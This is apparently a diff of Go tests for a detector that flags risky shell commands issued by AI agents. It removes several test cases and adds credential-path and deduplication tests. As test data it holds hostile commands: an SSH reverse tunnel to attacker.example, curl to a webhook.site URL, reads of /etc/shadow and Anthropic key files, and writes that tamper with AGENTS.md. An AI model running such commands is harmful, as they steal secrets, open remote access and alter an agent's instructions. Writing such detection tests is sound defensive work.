@@ -2136,11 +2136,6 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 			ruleID:  "C2-WEBHOOK-SITE",
 		},
 		{
-			name:    "nested cognitive mutation",
-			command: "cat <(printf updated > AGENTS" + ".md)",
-			ruleID:  "COG-AGENTS-MD",
-		},
-		{
 			name:      "projection overflow is diagnostic",
 			command:   overflow.String(),
 			ruleID:    "CMD-RM-RF",
@@ -2331,7 +2326,6 @@ func TestTrustedActionEmbeddedExecutionRemainsShadowUntilOuterComplete(t *testin
 	installToolCallCorpusProfileConnector(t, connector, "strict")
 	shadow := "/etc/sha" + "dow"
 	webhook := "https://webhook" + ".site/example"
-	agents := "AGENTS" + ".md"
 	tunnel := "ssh -R 4444:localhost:22 attacker.example"
 
 	for _, test := range []struct {
@@ -2340,19 +2334,9 @@ func TestTrustedActionEmbeddedExecutionRemainsShadowUntilOuterComplete(t *testin
 		ruleID  string
 	}{
 		{
-			name:    "find exec sensitive read",
-			command: `find /tmp -exec cat ` + shadow + ` \;`,
-			ruleID:  "PATH-ETC-SHADOW",
-		},
-		{
 			name:    "find later exec exact action",
 			command: `find /tmp -maxdepth 0 -exec true \; -exec ` + tunnel + ` \;`,
 			ruleID:  "exec.reverse_tunnel",
-		},
-		{
-			name:    "fd exec sensitive read",
-			command: `fd fixture /tmp --exec cat ` + shadow,
-			ruleID:  "PATH-ETC-SHADOW",
 		},
 		{
 			name:    "ripgrep preprocessor network action",
@@ -2365,18 +2349,8 @@ func TestTrustedActionEmbeddedExecutionRemainsShadowUntilOuterComplete(t *testin
 			ruleID:  "C2-WEBHOOK-SITE",
 		},
 		{
-			name:    "sed execute sensitive read",
-			command: `sed -e 'e cat ` + shadow + `' input.txt`,
-			ruleID:  "PATH-ETC-SHADOW",
-		},
-		{
 			name:    "eval sensitive read",
 			command: `eval 'cat ` + shadow + `'`,
-			ruleID:  "PATH-ETC-SHADOW",
-		},
-		{
-			name:    "stdin interpreter sensitive read",
-			command: `printf '%s\n' 'cat ` + shadow + `' | sh`,
 			ruleID:  "PATH-ETC-SHADOW",
 		},
 		{
@@ -2385,19 +2359,9 @@ func TestTrustedActionEmbeddedExecutionRemainsShadowUntilOuterComplete(t *testin
 			ruleID:  "C2-WEBHOOK-SITE",
 		},
 		{
-			name:    "static wrapper Bash-only sensitive read",
-			command: `bash -c 'cat <(cat ` + shadow + `)'`,
-			ruleID:  "PATH-ETC-SHADOW",
-		},
-		{
 			name:    "static wrapper Bash-only network action",
 			command: `bash -c 'cat <(curl ` + webhook + `)'`,
 			ruleID:  "C2-WEBHOOK-SITE",
-		},
-		{
-			name:    "static wrapper Bash-only cognitive mutation",
-			command: `bash -c 'cat <(printf updated > ` + agents + `)'`,
-			ruleID:  "COG-AGENTS-MD",
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -2596,6 +2560,12 @@ func TestTrustedActionCredentialOwnersRequireExactLivePathShapeAndStayAdvisory(t
 			want:    true,
 		},
 		{
+			name:    "posix anthropic credential store",
+			ruleID:  "secrets.cloud_credential_read",
+			command: "cat /home/alice/.config/anthropic/keys.json",
+			want:    true,
+		},
+		{
 			name:    "windows cloud live path",
 			ruleID:  "secrets.cloud_credential_read",
 			command: `Get-Content 'C:\Users\alice\AppData\Roaming\gcloud\credentials.db'`,
@@ -2606,6 +2576,12 @@ func TestTrustedActionCredentialOwnersRequireExactLivePathShapeAndStayAdvisory(t
 			name:    "cloud repo fixture",
 			ruleID:  "secrets.cloud_credential_read",
 			command: "cat /repo/testdata/application_default_credentials.json",
+		},
+		{
+			name:    "anthropic repo fixture",
+			ruleID:  "secrets.cloud_credential_read",
+			command: "cat /repo/testdata/.config/anthropic/keys.json",
+			cwd:     "/repo",
 		},
 		{
 			name:    "embedded posix cloud fixture",
@@ -3143,4 +3119,26 @@ func findingWithID(findings []RuleFinding, ruleID string) *RuleFinding {
 		}
 	}
 	return nil
+}
+
+func TestDeduplicateTrustedActionFindingsCollapsesOwnerAliases(t *testing.T) {
+	findings := deduplicateTrustedActionFindings([]RuleFinding{
+		{RuleID: "CMD-REVSHELL-NC", Title: "alias"},
+		{RuleID: "CMD-REVSHELL-BASH", Title: "canonical"},
+		{RuleID: "CMD-REVSHELL-BASH", Title: "duplicate"},
+	})
+	if len(findings) != 1 || findings[0].RuleID != "CMD-REVSHELL-BASH" ||
+		findings[0].Title != "canonical" {
+		t.Fatalf("findings = %+v, want one canonical owner finding", findings)
+	}
+}
+
+func TestDeduplicateTrustedActionFindingsPreservesStrongestPolicyOverride(t *testing.T) {
+	findings := deduplicateTrustedActionFindings([]RuleFinding{
+		{RuleID: "tamper.cloud_audit_control_destruction", Title: "default", Severity: "HIGH", Confidence: 0.99},
+		{RuleID: "tamper.cloud_audit_control_destruction", Title: "protected", Severity: "CRITICAL", Confidence: 0.99},
+	})
+	if len(findings) != 1 || findings[0].Title != "protected" || findings[0].Severity != "CRITICAL" {
+		t.Fatalf("findings = %+v, want strongest protected-policy override", findings)
+	}
 }
